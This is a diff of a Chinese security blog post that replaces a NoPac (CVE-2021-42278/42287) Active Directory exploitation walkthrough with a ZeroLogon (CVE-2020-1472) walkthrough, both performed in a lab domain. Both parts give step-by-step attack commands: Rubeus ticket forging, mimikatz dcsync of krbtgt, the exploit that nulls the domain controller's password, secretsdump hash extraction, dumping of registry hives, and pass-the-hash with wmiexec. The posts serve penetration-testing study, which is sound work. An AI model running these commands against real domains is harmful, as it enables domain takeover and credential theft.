@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          CVE-2021-42278/42287_NoPac - Kat | Blog
+          CVE-2020-1472 - Kat | Blog
         
     </title>
 
-    <link rel="canonical" href="https://spanning-tree.xyz/2022/073aa336e2.html">
+    <link rel="canonical" href="https://spanning-tree.xyz/2022/077531b9b0.html">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -91,11 +91,11 @@
                               <a class="tag" href="/tags/#域渗透" title="域渗透">域渗透</a>
                             
                         </div>
-                        <h1>CVE-2021-42278/42287_NoPac</h1>
+                        <h1>CVE-2020-1472</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by Kat on
-                            2022-07-15
+                            2022-07-16
                         </span>
                     </div>
                 
@@ -215,80 +215,58 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="cve-2021-4227842287_nopac">CVE-2021-42278/42287_NoPAC</h1>
+                <h1 id="cve-2020-1472_zerologon">CVE-2020-1472_ZeroLogon</h1>
 <h2 id="0x01-漏洞说明">0x01 漏洞说明</h2>
-<p>nopac漏洞是由CVE-2021-42287和CVE-2021-42278两个漏洞组合利用而成，通过普通域用户权限可提权到域管权限。</p>
+<p>通过该漏洞，攻击者只需能够访问域控的445端口，在无需任何凭据的情况下能拿到域管的权限。</p>
+<p>该漏洞的产生来源于Netlogon协议认证的加密模块存在缺陷，导致攻击者可以在没有凭证的情况情况下通过认证。</p>
 <h3 id="1-影响系统">1. 影响系统</h3>
-<p>未打补丁的全版本windows机器</p>
-<h2 id="0x02-成因">0x02 成因</h2>
-<p>Nopac漏洞的核心是通过Kerberos 处理Username字段时的缺陷和利用S4U2Self扩展生成了高权限的PAC。</p>
-<h3 id="1-kerberos处理username缺陷">1. Kerberos处理username缺陷</h3>
-<p><a href="https://github.com/KernelPanic-OpenSource/Win2K3_NT_ds/blob/0d97393773ee5ecdc29aae15023492e383f7ee7f/security/protocols/kerberos/server/tktutil.cxx" target="_blank" rel="noopener">Kerberos_winxp</a></p>
-<p>首先，如果找不到 UserName 的话，KDC会继续查找 UserName$</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pmv846nj20xq0u0q5y.jpg" alt="img"></p>
-<p>如果还是查找不到的话，KDC会继续查找altSecurityIdentities属性的值的用户。</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pn6p67ij212f0u0tby.jpg" alt="img"></p>
-<p>根据此漏洞我们想伪造域控机器账号随后让KDC找不到username后自动使用域控机器名(DC$)</p>
-<p>触发KDC找不到username主要有两种方式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016  (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019  (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-漏洞复现">0x02 漏洞复现</h2>
+<h3 id="1-验证">1. 验证</h3>
+<p><a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 zerologon_tester.py WIN-SJD97LJQLJP 192.168.40.132</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgsbns8j21o406qmyn.jpg" alt="img"></p>
+<h3 id="2-利用">2. 利用</h3>
+<p>整体利用流程：</p>
 <ol>
-<li>跨域请求：跨域请求时，目标域活动目录数据库是找不到其他域的用户的，因此会走进这个处理UserName的逻辑。</li>
-<li>修改saMAccountName属性：在当前域，可以通过修改saMAccountName属性让KDC找不到用户，然后走进这个处理UserName的逻辑。</li>
+<li>置空域控中保存的密码</li>
+<li>导出域用户哈希（利用置控的域机器账户，域机器是不可登录的。）</li>
+<li>恢复域控机器用户密码</li>
 </ol>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pnbuc2bj212u0820uv.jpg" alt="img"></p>
-<h3 id="2-利用s4u2self-生成高权限pac">2. 利用S4U2Self 生成高权限PAC</h3>
-<p>现在根据上面Kerberos查找username的缺陷我们有了可伪造域控的可能性，但是根本的认证还需要PAC的生成。</p>
-<p><strong>正常Kerberos认证PAC的生成过程：</strong></p>
-<ol>
-<li>KDC在收到客户端发来的AS-REQ请求后，从请求中取出cname字段，然后查询活动目录数据库，找到sAMAccountName属性为cname字段的值的用户，用该用户的身份生成一个对应的PAC。</li>
-<li>KDC在收到客户端发来TGS-REQ请求后，利用krbtgt密钥对TGT票据解密，然后取出PAC。然后验证PAC的签名，如果签名正确，则证明PAC未经过篡改。然后将TGT认购权证中的PAC直接拷贝到ST服务票据中。(图示一)</li>
-</ol>
-<p><a href="https://github.com/KernelPanic-OpenSource/Win2K3_NT_ds/blob/0d97393773ee5ecdc29aae15023492e383f7ee7f/security/protocols/kerberos/server/gettgs.cxx" target="_blank" rel="noopener">gettgs.cxx</a></p>
-<p>正常流程中PAC生成，可以看到ST票据中的PAC直接cpoy TGT票据中的</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pnlafitj217p0u077a.jpg" alt="img"></p>
-<p><strong>S4U2Self协议中PAC生成过程</strong></p>
-<p>KDC收到客户端发来的TGS-REQ S4U2Self协议，在验证了客户端是否具有发起S4U2Self协议权限后，会根据S4U2Self协议中模拟的用户生成对于权限的PAC，然后放在ST服务票据中，并不会复用TGT认购权证中的PAC！</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pnpwsmrj20x70u0q5x.jpg" alt="img"></p>
-<p>所以我们发现在正常的Kerberos认证过程中，ST票据种的PAC是直接从TGT票据种copy过来的，那么在S4U2Self请求中，PAC是重新生成的。</p>
-<h2 id="0x03-漏洞利用">0x03 漏洞利用</h2>
-<p>在针对以上问题之后我们可以发现一条完善的攻击链：</p>
-<ol>
-<li>利用普通域账户权限创建机器用户，修改机器名为域控机器名</li>
-<li>申请TGT票据后将机器名重置</li>
-<li>利用S4U2Self协议申请ST票据(PAC为KDC重新生成)</li>
-</ol>
-<h3 id="1-手动实现">1. 手动实现</h3>
-<p>创建机器用户</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py -computer-name <span class="string">"machine"</span> -computer-pass <span class="string">"123456"</span> -dc-ip 192.168.40.132 spanning-tree.org/lisi:<span class="string">"123456"</span> -method SAMR -debug</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47ppby6nlj22n406cdhw.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47ppaahkyj21bn0u0n4o.jpg" alt="img"></p>
-<p>修改机器用户sAMAccountName为域控机器名(不带$)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 renameMachine.py -current-name <span class="string">"machine$"</span> -new-name <span class="string">"WIN-SJD97LJQLJP"</span> -dc-ip WIN-SJD97LJQLJP.spanning-tree.org spanning-tree.org/lisi:<span class="string">"123456"</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pp5tysfj22fi060wgp.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pp2pmuoj22ch0u04an.jpg" alt="img"></p>
-<p>申请TGT票据</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:<span class="string">"WIN-SJD97LJQLJP"</span> /password:<span class="string">"123456"</span> /domain:<span class="string">"spanning-tree.org"</span> /dc:<span class="string">"WIN-SJD97LJQLJP.spanning-tree.org"</span> /nowrap /ptt</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47powtoyvj22f20u04b0.jpg" alt="img"></p>
-<p>将之前创建的机器用户sAMAccountName修改为原先的机器名称(这一步为了Kerberos在处理username的时候找不到机器名，便自动使用域控$名)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 renameMachine.py -current-name <span class="string">"WIN-SJD97LJQLJP"</span> -new-name <span class="string">"machine$"</span> -dc-ip WIN-SJD97LJQLJP.spanning-tree.org spanning-tree.org/lisi:<span class="string">"123456"</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47porc01jj22lk05a40m.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47poqlafxj21q30u0qc8.jpg" alt="img"></p>
-<p>利用S4u2Self协议请求访问ldap/WIN-SJD97LJQLJP.spanning-tree.org的ST服务票据</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:<span class="string">"administrator"</span> /altservice:<span class="string">"ldap/WIN-SJD97LJQLJP.spanning-tree.org"</span> /dc:<span class="string">"WIN-SJD97LJQLJP.spanning-tree.org"</span> /ptt /ticket:上一步申请的TGT</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pok7x87j21nh0u0wql.jpg" alt="img"></p>
-<p>使用mimikatz的dcsync功能成功获取krbtgt哈希</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:spanning-tree.org /user:krbtgt /csv"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47poecdn4j21ds0imwhx.jpg" alt="img"></p>
-<h3 id="2-自动化工具利用">2. 自动化工具利用</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noPac.exe -domain spanning-tree.org -user lisi -pass <span class="string">"123456"</span> /dc WIN-SJD97LJQLJP.spanning-tree.org /mAccount machine /mPassword 123456 /service cifs /ptt=</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47poaaekzj22xe0omaqi.jpg" alt="img"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:spanning-tree.org /user:krbtgt /csv"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47po7o0y2j21jm0eqtb9.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47po2ze0yj21am0feadf.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47po11u4xj21je07iab6.jpg" alt="img"></p>
-<p>扫描工具：</p>
-<p><a href="https://github.com/knightswd/NoPacScan" target="_blank" rel="noopener">https://github.com/knightswd/NoPacScan</a></p>
-<h4 id="reference">Reference</h4>
-<p>谢公子@深信服深蓝攻防实验室</p>
+<h4 id="21-置空域控机器用户密码">2.1 置空域控机器用户密码</h4>
+<p><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">CVE-2020-1472</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgt07g1j21og0aytan.jpg" alt="img"></p>
+<h4 id="22-导出ntds哈希">2.2 导出ntds哈希</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\secretsdump.py spanning-tree.org/WIN-SJD97LJQLJP<span class="variable">$@WIN</span>-SJD97LJQLJP -dc-ip 192.168.40.132 -no-pass -just-dc-user administrator</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgvvdk7j22q00ak41k.jpg" alt="img"></p>
+<h4 id="23-恢复域控机器用户密码">2.3 恢复域控机器用户密码</h4>
+<p>在攻击过程中，我们将机器的密码置为空，这一步是会导致域控脱域的。所以我们需要及时恢复，我们将AD中的密码与注册表/lsass里面的密码保持一致。</p>
+<p>主要有三种方法：</p>
+<p><strong>从注册表/lsass里面读取机器用户原先的密码，恢复AD里面的密码</strong></p>
+<p>我们直接通过reg save命令 将注册表里面的信息拿回本地，然后通过secretsdump提取出里面的hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\wmiexec.py spanning-tree.org/administrator@192.168.40.132 -hashes aad3b435b51404eeaad3b435b51404ee:****</span><br></pre></td></tr></table></figure>
+<p>这里有个问题，如果域控下当前目录存在导出的凭据的话，在执行导出注册表的时候会一直卡住在命令执行阶段。</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgylujej22to0o644g.jpg" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgzqwqaj22wy0jogp6.jpg" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xh1qpykj22xc0qugvv.jpg" alt="img"></p>
+<p>使用<a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">CVE-2020-1472</a>下的restorepassword进行恢复</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\restorepassword.py spanning-tree.org/WIN-SJD97LJQLJP@WIN-SJD97LJQLJP -target-ip 192.168.40.132 -hexpass ***</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xh6cjanj22xa08g429.jpg" alt="img"></p>
+<p>再次尝试导出域哈希失败</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xha0rbdj22q005840e.jpg" alt="img"></p>
+<p>也可以使用<a href="https://github.com/risksense/zerologon" target="_blank" rel="noopener">risksense_zerologon</a>下的reinstall_original_pw.py来恢复，相当于重新进行一次攻击，计算密码的时候使用了空密码的hash去计算session_key。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reinstall_original_pw.py WIN-SJD97LJQLJP 192.168.40.132 4f6d7e91463d3ea150e57b50fbbca2c2</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xhd9qx1j22xe0quajh.jpg" alt="img"></p>
+<p><strong>从ntds.dict里面读取AD历史密码，然后恢复AD里面的密码</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\secretsdump.py spanning-tree.org/WIN-SJD97LJQLJP<span class="variable">$@WIN</span>-SJD97LJQLJP -dc-ip 192.168.40.132 -no-pass -histoty</span><br></pre></td></tr></table></figure>
+<p>不太稳定，有时候会读不出来</p>
+<p><strong>重置计算机的机器帐户密码(包括AD，注册表，lsass里面的密码)</strong></p>
+<p>这里使用的是powershell 的cmdletReset-ComputerMachinePassword，是微软针对计算机脱域的情况下给出的一种解决方案。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 .\wmiexec.py spanning-tree.org/administrator@WIN-SJD97LJQLJP -hashes aad3b435b51404eeaad3b435b51404ee:**** -code GBK</span><br><span class="line"></span><br><span class="line">powershell Reset-ComputerMachinePassword</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xhhicg9j22ye0bmach.jpg" alt="img"></p>
 
                 
 
@@ -296,13 +274,9 @@
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2022/077531b9b0.html" data-toggle="tooltip" data-placement="top" title="CVE-2020-1472">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2022/05c2883ac0.html" data-toggle="tooltip" data-placement="top" title="Kerberos协议利用">Next Post &rarr;</a>
+                            <a href="/2022/073aa336e2.html" data-toggle="tooltip" data-placement="top" title="CVE-2021-42278/42287_NoPac">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -358,7 +332,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#cve-2021-4227842287_nopac"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">CVE-2021-42278/42287_NoPAC</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-漏洞说明"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">0x01 &#x6F0F;&#x6D1E;&#x8BF4;&#x660E;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-影响系统"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">1. &#x5F71;&#x54CD;&#x7CFB;&#x7EDF;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-成因"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">0x02 &#x6210;&#x56E0;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-kerberos处理username缺陷"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">1. Kerberos&#x5904;&#x7406;username&#x7F3A;&#x9677;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-利用s4u2self-生成高权限pac"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">2. &#x5229;&#x7528;S4U2Self &#x751F;&#x6210;&#x9AD8;&#x6743;&#x9650;PAC</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x03-漏洞利用"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">0x03 &#x6F0F;&#x6D1E;&#x5229;&#x7528;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-手动实现"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">1. &#x624B;&#x52A8;&#x5B9E;&#x73B0;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-自动化工具利用"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">2. &#x81EA;&#x52A8;&#x5316;&#x5DE5;&#x5177;&#x5229;&#x7528;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#reference"><span class="toc-nav-number">1.3.2.1.</span> <span class="toc-nav-text">Reference</span></a></li></ol></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#cve-2020-1472_zerologon"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">CVE-2020-1472_ZeroLogon</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-漏洞说明"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">0x01 &#x6F0F;&#x6D1E;&#x8BF4;&#x660E;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-影响系统"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">1. &#x5F71;&#x54CD;&#x7CFB;&#x7EDF;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-漏洞复现"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">0x02 &#x6F0F;&#x6D1E;&#x590D;&#x73B0;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-验证"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">1. &#x9A8C;&#x8BC1;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-利用"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">2. &#x5229;&#x7528;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#21-置空域控机器用户密码"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">2.1 &#x7F6E;&#x7A7A;&#x57DF;&#x63A7;&#x673A;&#x5668;&#x7528;&#x6237;&#x5BC6;&#x7801;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#22-导出ntds哈希"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">2.2 &#x5BFC;&#x51FA;ntds&#x54C8;&#x5E0C;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#23-恢复域控机器用户密码"><span class="toc-nav-number">1.2.2.3.</span> <span class="toc-nav-text">2.3 &#x6062;&#x590D;&#x57DF;&#x63A7;&#x673A;&#x5668;&#x7528;&#x6237;&#x5BC6;&#x7801;</span></a></li></ol></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
